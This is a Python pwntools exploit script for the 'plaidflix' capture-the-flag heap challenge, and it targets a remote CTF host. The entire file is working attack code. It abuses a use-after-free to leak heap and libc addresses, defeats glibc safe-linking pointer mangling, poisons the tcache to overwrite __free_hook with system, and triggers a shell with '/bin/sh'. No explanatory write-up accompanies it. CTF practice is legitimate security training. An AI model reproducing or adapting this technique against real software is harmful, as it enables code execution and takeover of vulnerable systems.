#!/usr/bin/env python3

from pwn import *

exe = ELF("./plaidflix")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("plaidflix.pwni.ng", 1337)

def sl(inp):
    r.sendlineafter("> ", inp)

def send_name(name):
    r.sendlineafter("> ", name)

def delete_account():
    sl("2")
    sl("y")

def add_feedback(fb="MAHER"):
    sl("0")
    sl(fb)

def delete_feedback(index):
    sl("1")
    sl(str(index))

def manage_movies():
    sl("0")

def add_movie(movie, rating=1):
    manage_movies()
    sl("0")
    sl(movie)
    sl(str(rating))

def remove_movie(index):
    manage_movies()
    sl("1")
    sl(str(index))

def show_movies():
    manage_movies()
    sl("2")

def share_movie(movie, friend):
    manage_movies()
    sl("3")
    sl(str(movie))
    sl(str(friend))


def manage_friends():
    sl("1")

def add_friend(size, data):
    manage_friends()
    sl("0")
    sl(str(size))
    sl(data)

def remove_friend(index):
    manage_friends()
    sl("1")
    sl(str(index))

def show_friends():
    manage_friends()
    sl("2")

def add_contact(data):
    sl("2")
    sl(data)

def defu(p):
	d = 0
	for i in range(0x100,0,-4):
		pa = (p & (0xf << i )) >> i
		pb = (d & (0xf << i+12 )) >> i+12
		d |= (pa ^ pb) << i
	return d

def mask(heap_b, target):
    return target ^ (heap_b >> 0xc)

def main():
    
    send_name("MAHER")

    add_movie("MOVIE1")
    
    for i in range(8):
        add_friend(0x78, b"M"*0x80)
    
    add_movie("PADD")

    for i in range(8):
        remove_friend(str(i))

    add_friend(0x78, b"M"*0x80)
    share_movie(0, 0)
    remove_friend(0)
    show_movies()
    
    r.recvuntil("* Shared with: ")
    leak = u64(r.recvline().strip().ljust(8, p8(0)))
    log.warn("Heap leak @ 0x%x", leak)
    defuscated = defu(leak)
    log.warn("Heap leak defuscated : 0x%x", defuscated)
    heap_b = defuscated - 0x6e0
    for i in range(8):
        add_friend(0x78, b"M"*0x78)

    for i in range(7):
        remove_friend(str(i))

    share_movie(0, 7)
    remove_friend(7)
    
    add_friend(0x88, b"A"*0x80)
    show_movies()
    r.recvuntil("* Shared with: ")
    libc_leak = u64(r.recvline().strip().ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", libc_leak)

    delete_account()
    
    for i in range(10):
        add_feedback()

    for i in range(7):
        delete_feedback(i)
    
    delete_feedback(8)
    delete_feedback(7) 
    
    add_feedback()
    delete_feedback(8)
    
    libc.address = libc_leak - 0x1e3c80
    heap_base = defuscated - 0x690
    log.warn("Libc base @ 0x%x", libc.address)
    log.warn("Heap base @ 0x%x", heap_base)
    add_contact(b"A"*0x108 + p64(0x111) + p64(mask(heap_base+0x1200, libc.sym['__free_hook'])))

    add_feedback("/bin/sh")
    add_feedback(p64(libc.sym['system']))
    delete_feedback(8)

    r.interactive()


if __name__ == "__main__":
    main()
